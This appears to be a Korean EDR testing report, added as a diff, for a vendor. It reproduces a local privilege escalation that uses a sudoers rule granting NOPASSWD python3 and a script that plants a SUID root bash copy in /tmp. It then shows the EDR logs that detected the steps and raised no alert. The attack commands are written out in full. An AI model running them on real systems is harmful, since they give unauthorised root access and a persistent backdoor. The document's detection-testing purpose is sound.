@@ -1,0 +1,97 @@
+================================================================================
+FND-002 재현 절차 및 로그 — 로컬 권한상승(SUID) 탐지 / 위협 알림 미승격
+  제조사(EDR-X/파트너사) 분석 요청용
+작성: 2026-06-24  /  EDR-X EDR PoC 검증팀
+================================================================================
+
+[요청 요지]
+EDR-X Agent는 로컬 권한상승(SUID 백도어 생성)을 행동지표(BEHAVIOR_INDICATOR,
+SUID_SET, MITRE T1548.001)로 정확히 탐지합니다. 다만 해당 행동지표가 관리 콘솔의
+위협(Threat)/알림(Alert)으로 승격되지 않아 raw 텔레메트리에만 적재됩니다. 아래 재현 절차와
+실제 로그를 공유드리니, (1) 이것이 의도된 동작인지 (2) 행동지표를 위협/알림으로 승격하는
+구성(correlation 등)이 가능한지 안내 부탁드립니다.
+
+--------------------------------------------------------------------------------
+[환경]
+--------------------------------------------------------------------------------
+- 가상화 : Colima (Apple Virtualization.framework, x86_64)
+- OS/커널: Ubuntu 24.04 / kernel 6.8.0-64-generic
+- Agent  : EDR-X Linux <agent-version> (콘솔상 Enabled / connected / up-to-date)
+- 콘솔   : On-Prem (edr-console.local) / 로그 레이크 SIEM-X(OpenSearch)
+
+--------------------------------------------------------------------------------
+[재현 절차 — 로컬 권한상승 (sudoers 오설정 악용)]
+--------------------------------------------------------------------------------
+※ 본질: sudo 권한이 부여된 인터프리터(python/pip 등)를 통해 root로 임의 코드를 실행 →
+  SUID 백도어 생성 → 비-root 사용자가 euid=0 획득. (pip PEP517 빌드백엔드 악용과 동일 패턴)
+
+# 1) 취약 sudoers 오설정 (비-root 'crtester'에 sudo python3 허용)
+echo 'crtester ALL=(root) NOPASSWD: /usr/bin/python3' > /etc/sudoers.d/99-poc-privesc
+
+# 2) 공격자(crtester)가 악성 스크립트로 SUID 백도어 생성
+#    evil.py:
+#      import os
+#      os.system("cp /bin/bash /tmp/<marker>_rootbash")
+#      os.system("chown root:root /tmp/<marker>_rootbash")
+#      os.system("chmod 4755 /tmp/<marker>_rootbash")
+sudo -u crtester bash -c 'cd /tmp/poc && sudo /usr/bin/python3 evil.py'
+
+# 3) 비-root 'crtester'가 SUID 백도어로 권한상승
+sudo -u crtester /tmp/<marker>_rootbash -p -c 'id'
+  결과: uid=1000(crtester) gid=1002(crtester) euid=0(root)   <-- 권한상승 성공
+
+--------------------------------------------------------------------------------
+[탐지 결과 — EDR-X 행동지표 (SIEM-X raw .edr 실측)]
+--------------------------------------------------------------------------------
+# 이벤트 분포 (마커 검색 46건)
+  cp     : BEHAVIOR_INDICATOR + FILEMODIFICATION   <- /bin/bash 복사
+  chmod  : BEHAVIOR_INDICATOR                       <- SUID 비트 설정
+  sudo / python3.12 / bash / dash : PROCESSCREATION   <- 공격 프로세스 계보
+
+# [로그 원문] SUID 설정 탐지 (핵심)
+  event     : BEHAVIOR_INDICATOR
+  timestamp : 2026-06-24T05:08:25.801Z
+  endpoint  : colima   | agent: <agent-version>
+  process   : chmod (pid 49755)
+  cmdline   : chmod 4755 /tmp/<marker>_rootbash
+  indicator : identifier="SUID-IND"  name="SUID_SET"
+              description="Set the setuid bit on a file"
+  MITRE     : T1548.001 (Setuid and Setgid)
+  category  : Privilege Escalation / Defense Evasion / Persistence
+
+# [로그 원문] bash 복사 탐지
+  event     : BEHAVIOR_INDICATOR
+  process   : cp
+  cmdline   : cp /bin/bash /tmp/<marker>_rootbash
+  (동일 timestamp)
+
+--------------------------------------------------------------------------------
+[위협/알림 승격 여부]
+--------------------------------------------------------------------------------
+# 동일 마커로 위협 인덱스 조회
+  logs-edr.threats : 0 건   <-- 위협으로 승격되지 않음
+  logs-edr.alert   : 0 건   (상관분석 알림 인덱스 비어 있음)
+
+# 참고: 본 배포 전체 신호 분포 (별도 측정)
+  raw 텔레메트리(.edr)  : 약 6,406,152 건
+  actionable 위협(.threats): 16 건 (대부분 known-malware: EICAR/Lockbit 등)
+  상관분석 알림(.alert) : 0 건
+
+--------------------------------------------------------------------------------
+[질의 사항]
+--------------------------------------------------------------------------------
+ 1. 위 SUID 권한상승(SUID_SET, T1548.001)이 행동지표로는 탐지되나 위협/알림으로
+    승격되지 않는 것이 의도된 동작인지요?
+ 2. 행동지표(Behavioral Indicators)를 위협 또는 알림으로 승격하기 위한 정책/룰(correlation
+    상관분석 등) 구성이 가능한지, 권장 구성이 있는지요?
+ 3. 비-root의 euid=0 획득(SUID 실행) 단계 자체에 대한 별도 탐지 지표가 있는지요?
+    (현재 관측된 행동지표는 생성 단계의 cp/chmod 에 집중)
+
+--------------------------------------------------------------------------------
+[비고]
+--------------------------------------------------------------------------------
+- 본 재현은 비파괴적입니다. 생성한 SUID 백도어/sudoers drop-in/PoC 디렉토리는 즉시
+  삭제했으며, 테스트 후 /tmp 및 /etc/sudoers.d 에 비인가 SUID/설정 잔존이 없음을 확인했습니다.
+- 별도 사내 리포트의 "센서 미탐지" 결과는 타 제품(Cybereason) / 타 환경(Rocky Linux 8.10)
+  대상이며, 본 EDR-X 평가와는 무관한 참고 사항입니다.
+================================================================================
